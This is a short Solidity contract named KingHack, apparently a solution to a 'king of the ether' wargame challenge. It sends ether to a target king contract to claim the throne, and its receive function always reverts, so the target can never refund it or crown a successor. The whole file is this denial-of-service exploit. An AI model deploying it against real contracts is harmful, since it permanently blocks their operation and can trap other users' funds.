// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingHack {
    constructor(address kingAddress) payable {
        kingAddress.call{value: msg.value}("");
    }

    receive() external payable {
        // Always revert when receiving funds
        revert();
    }
}
